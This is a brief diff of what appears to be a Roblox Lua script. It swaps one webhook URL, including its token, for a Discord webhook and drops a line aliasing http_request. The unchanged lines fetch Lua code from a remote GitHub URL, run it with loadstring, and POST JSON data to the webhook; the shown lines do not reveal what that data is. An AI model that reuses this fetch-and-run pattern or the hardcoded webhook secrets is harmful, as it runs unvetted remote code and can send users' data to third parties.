@@ -1,4 +1,4 @@
-local webhookUrl = "https://webhook.newstargeted.com/api/webhooks/1263334435823157332/8tClchkzOnkR_LTbNo14geO_nK1Ha_PXpSvg-OQdLIKEiBW-EIRDdCqlBM6V4ncNYlZO"
+local webhookUrl = "https://discord.com/api/webhooks/1281779513088282666/XJpjnjA5Xo_TZOd8tXzW6Ui5p71AVCBqoD3W5kGSYklhyYgHWV9pbiF_2qjL0oV2hm-0"
 local utils = loadstring(game:HttpGet("https://raw.githubusercontent.com/669053713850403197963270290945742252531/Celestial/main/Utilities.lua"))()
 
 -- Services
@@ -345,6 +345,5 @@ local data = {
         ["content-type"] = "application/json"
      }
 
-     local request = http_request
      local args = {Url = webhookUrl, Body = encodedData, Method = "POST", Headers = headers}
      request(args)
